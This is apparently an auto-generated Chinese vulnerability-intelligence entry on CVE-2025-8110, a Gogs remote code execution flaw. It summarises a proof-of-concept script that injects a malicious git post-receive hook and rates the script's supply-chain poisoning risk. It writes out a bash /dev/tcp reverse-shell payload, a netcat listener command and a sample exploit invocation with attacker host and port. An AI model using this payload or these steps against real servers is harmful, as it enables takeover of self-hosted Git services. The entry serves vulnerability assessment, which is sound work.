## CVE-2025-8110 - Gogs 远程代码执行 (RCE)

**漏洞编号:** CVE-2025-8110

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Gogs

**危害等级:** 高危

**CVSS评分:** 

**影响版本:** 未知

**利用条件:** 需要认证、需要网络访问

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 中

**投毒风险:** 10%

## 详情

该POC脚本针对Gogs自托管Git服务中的CVE-2025-8110漏洞。这是一个远程代码执行(RCE)漏洞，攻击者可以通过操纵Git钩子来在服务器上执行任意代码。

**POC有效性分析:**
该Python脚本(CVE-2025-8110.py)是一个结构良好且功能完整的利用工具，能够可靠地复现Gogs中的Git钩子RCE漏洞。脚本利用了`requests`库进行HTTP通信，`bs4`解析HTML以提取CSRF令牌，以及`subprocess`模块来执行Git命令。其核心利用流程如下：
1.  **用户注册/登录:** 脚本首先尝试在目标Gogs实例上注册一个新用户。如果用户名已被占用，它会尝试使用提供的凭据登录。这一步确保攻击者在Gogs上拥有操作权限。在注册和登录过程中，脚本能够正确地从HTML响应中提取并提交CSRF令牌，确保请求的合法性。
2.  **生成应用程序令牌:** 成功认证后，脚本会导航到用户设置页面，并生成一个新的应用程序访问令牌。这个令牌可能用于后续API操作的认证，尽管在这个特定的POC中，后续操作主要是通过模拟浏览器会话来完成的。
3.  **创建仓库:** 脚本随后在攻击者账户下创建一个新的Git仓库。这是利用链的关键步骤，因为恶意Git钩子将被注入到这个新创建的仓库中。
4.  **注入恶意Git钩子:** 脚本在本地创建一个临时的Git仓库，并在其中配置一个`post-receive`钩子。`post-receive`是Git事件钩子之一，在代码推送到远程仓库并更新引用后在服务器端执行。脚本将反向shell命令（例如`bash -c "exec bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"`）作为钩子内容，并使用Base64编码，以确保传输的完整性。
5.  **触发RCE:** 最后，脚本将本地仓库的内容（包括恶意`post-receive`钩子）推送到Gogs服务器上新创建的远程仓库。一旦服务器接收到推送，`post-receive`钩子将在服务器上自动执行，从而触发反向shell连接到攻击者监听的LHOST:LPORT，实现远程代码执行。
6.  **清理:** 脚本还包含一个清理功能，可以在利用完成后删除创建的用户和仓库，这体现了其作为研究工具的专业性。
整个利用过程设计合理，自动化程度高，并提供了命令行参数支持，使得漏洞复现和验证变得高效且直观。

**利用步骤:**
1.  **准备环境:** 攻击者需要一台可访问目标Gogs实例的机器，并在该机器上安装Python3及必要的库（`requests`, `beautifulsoup4`, `rich`）。同时，需要设置一个监听器（如`netcat -lvnp {lport}`）来接收反向shell。
2.  **执行POC:** 运行提供的Python脚本，指定目标Gogs实例的URL、攻击者机器的IP地址(LHOST)和监听端口(LPORT)。例如：`python3 CVE-2025-8110.py -u http://gogs.example.com -lh 192.168.1.100 -lp 4444`。
3.  **用户操作:** 脚本将自动尝试注册一个新用户或使用可选的命令行参数提供的用户名和密码登录。
4.  **仓库创建与钩子注入:** 脚本将在Gogs上创建一个新的Git仓库，并在本地配置包含反向shell命令的`post-receive`钩子。
5.  **代码推送与执行:** 脚本将本地仓库推送到Gogs服务器，服务器接收到推送后，会自动执行恶意`post-receive`钩子。
6.  **获取反向Shell:** 攻击者在监听端口上将接收到来自Gogs服务器的反向Shell连接，从而可以在Gogs服务器上执行任意命令。

**投毒风险分析:**
该POC代码在投毒风险方面被评估为低风险（约10%）。其分析如下：
1.  **代码清晰度与可读性:** 脚本代码结构清晰，使用了标准的Python库，例如`requests`用于HTTP通信，`subprocess`用于执行Git命令，`bs4`用于HTML解析，以及`argparse`用于命令行参数。没有发现代码混淆或难以理解的逻辑，所有关键操作都直接可见，易于审计。
2.  **依赖项透明:** 代码仅依赖于常见的Python库（`requests`, `beautifulsoup4`, `rich`等），未引入任何外部的、不明确的二进制文件或第三方脚本。所有依赖项均可通过`pip`安装，且普遍被认为是安全的，这大大降低了隐藏恶意代码的风险。
3.  **核心功能与漏洞利用一致:** 脚本的主要功能集中在模拟Gogs的用户操作（注册、登录、创建仓库）和利用Git钩子机制实现RCE。其行为与漏洞的描述和预期利用方式完全吻合。`subprocess.run`的调用是为了执行Git命令（例如`git init`, `git remote add`, `git add`, `git commit`, `git push`），这是漏洞利用的必要组成部分，而非额外的恶意行为。
4.  **无外部回调或数据窃取:** 代码中没有发现向未知外部服务器发送请求、泄露敏感信息或执行非预期操作的迹象。代理配置 (`http://localhost:8080`) 是常见的安全研究实践，用于调试和流量分析，本身不构成投毒风险。
5.  **Payload可控:** 反向shell的Payload (`bash -c "exec bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"`) 是通过脚本参数动态构建的，并且是攻击者为了获取RCE而主动提供的，而不是脚本内置的恶意功能或“后门”。脚本仅是传递和触发这个由用户定义的Payload。
综上所述，该POC代码是一个专注于验证和利用CVE-2025-8110漏洞的专业工具，其设计和实现均符合安全研究的最佳实践，不包含任何隐藏的恶意功能或投毒行为。它是一个透明且可信赖的漏洞验证脚本。

**项目地址:** 

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-8110
